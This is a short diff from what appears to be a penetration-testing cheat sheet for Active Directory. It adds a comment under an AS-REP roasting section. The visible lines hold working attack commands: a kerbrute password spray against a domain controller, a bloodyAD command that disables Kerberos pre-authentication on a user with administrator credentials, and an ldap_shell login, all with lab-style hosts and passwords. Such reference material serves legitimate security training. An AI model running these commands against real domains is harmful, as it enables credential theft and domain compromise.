@@ -56,6 +56,7 @@ kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter20
 
 
 # AS-REP roasting
+#disable pre authentication mechanism we you have domain credentials. 
 bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH
 
 ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
